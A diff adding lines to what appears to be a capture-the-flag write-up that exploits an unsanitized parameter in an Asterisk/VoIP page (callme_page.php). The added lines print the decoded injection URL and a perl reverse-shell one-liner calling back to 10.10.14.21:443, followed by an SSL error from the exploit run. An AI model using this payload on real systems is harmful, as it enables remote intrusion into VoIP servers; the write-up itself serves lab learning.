@@ -104,7 +104,17 @@ What is happening here?
 
 There is an unsanitized parameter in the recordings/misc/callme_page.php page. And this parameter ends up in the Asterisk Management Interface socket. The payload is eventually executed on the VOIP server.
 
-So I run the code:
+The payload is URL encoded, so lets decode it and enter our variables to see what it looks like:
+
+```
+'https://10.129.84.71/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n
+Application: system
+Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.21:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+
+So we are connecting back using perl.
+
+I run the code:
 
 ```
 IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
